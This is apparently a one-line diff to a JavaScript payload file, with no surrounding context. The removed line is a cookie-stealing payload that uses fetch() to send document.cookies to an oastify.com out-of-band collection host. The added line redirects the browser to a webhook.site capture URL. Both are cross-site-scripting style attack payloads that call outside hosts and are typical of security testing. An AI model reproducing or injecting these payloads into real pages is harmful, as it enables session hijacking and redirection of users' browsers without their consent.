@@ -1,1 +1,1 @@
-fetch("http://as6qinh4krk3d328qq9cenzn3e97xw.oastify.com/"+document.cookies);
+window.location.href='https://webhook.site/#!/6c90eef6-1fc5-43f3-b05b-800a1c1fcc21';
